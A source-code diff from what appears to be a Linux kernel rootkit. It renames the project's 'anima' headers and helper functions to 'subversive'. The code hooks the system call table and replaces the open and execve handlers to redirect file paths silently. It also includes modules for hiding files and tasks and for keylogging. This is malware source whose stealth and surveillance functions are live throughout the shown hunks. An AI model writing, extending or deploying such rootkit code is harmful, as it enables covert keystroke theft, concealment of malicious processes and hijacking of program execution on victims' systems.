@@ -6,19 +6,19 @@
 #include <linux/kernel.h>
 #include <linux/perf_event.h>
 
-#include <anima/arch.h>
-#include <anima/config.h>
-#include <anima/debug.h>
-#include <anima/hide_file.h>
-#include <anima/hide_task.h>
-#include <anima/keylogger.h>
-#include <anima/ksyms.h>
-#include <anima/libc.h>
-#include <anima/uaccess.h>
-#include <anima/structs.h>
-#include <anima/syscalls.h>
-#include <anima/anima_ctl.h>
-#include <anima/vfs.h>
+#include <subversive/arch.h>
+#include <subversive/config.h>
+#include <subversive/debug.h>
+#include <subversive/hide_file.h>
+#include <subversive/hide_task.h>
+#include <subversive/keylogger.h>
+#include <subversive/ksyms.h>
+#include <subversive/libc.h>
+#include <subversive/uaccess.h>
+#include <subversive/structs.h>
+#include <subversive/syscalls.h>
+#include <subversive/subversive_ctl.h>
+#include <subversive/vfs.h>
 
 #define HOOK(sys, func)	\
 		do {	\
@@ -134,7 +134,7 @@ asmlinkage long new_sys_open(char *filename, int flags, umode_t mode)
 		goto out;
 	}
 
-	old_path = anima_strndup_from_user(filename, MAX_PATH_LEN);
+	old_path = subversive_strndup_from_user(filename, MAX_PATH_LEN);
 	if (!old_path)
 		goto out;
 
@@ -153,7 +153,7 @@ asmlinkage long new_sys_open(char *filename, int flags, umode_t mode)
 		SET_OLD_FS;
 		return ret;
 	}
-	anima_vfree(old_path);
+	subversive_vfree(old_path);
 out:
 	return ksyms.old_sys_open(filename, flags, mode);
 }
@@ -237,14 +237,14 @@ new_sys_execve(const char *__filename, const char **argv, const char **envp)
 	char *old_path, *new_path;
 	char *filename = (char *)__filename;
 
-	old_path = anima_strndup_from_user(filename, MAX_PATH_LEN);
+	old_path = subversive_strndup_from_user(filename, MAX_PATH_LEN);
 	if (!old_path)
 		goto out;
 
 	new_path = get_redirect_path((char *)old_path, REDIRECT_PATH_EXECVE);
 	if (new_path) {
-		unsigned int new_path_len = anima_strlen(new_path);
-		int path_len_delta = (int)new_path_len - (int)anima_strlen(old_path);
+		unsigned int new_path_len = subversive_strlen(new_path);
+		int path_len_delta = (int)new_path_len - (int)subversive_strlen(old_path);
 
 		pr_debug("%s: redirect %s to %s\n", __func__, old_path, new_path);
 
@@ -265,7 +265,7 @@ new_sys_execve(const char *__filename, const char **argv, const char **envp)
 			filename += path_len_delta;
 		}
 	}
-	anima_vfree(old_path);
+	subversive_vfree(old_path);
 out:
 	return ksyms.old_sys_execve(filename, argv, envp);
 }
@@ -563,7 +563,7 @@ void ia32_system_call_hook(struct pt_regs *regs)
 
 int hook_sys_call_table(void)
 {
-	anima_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));
+	subversive_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));
 
 	HOOK(uname, new_sys_newuname);
 
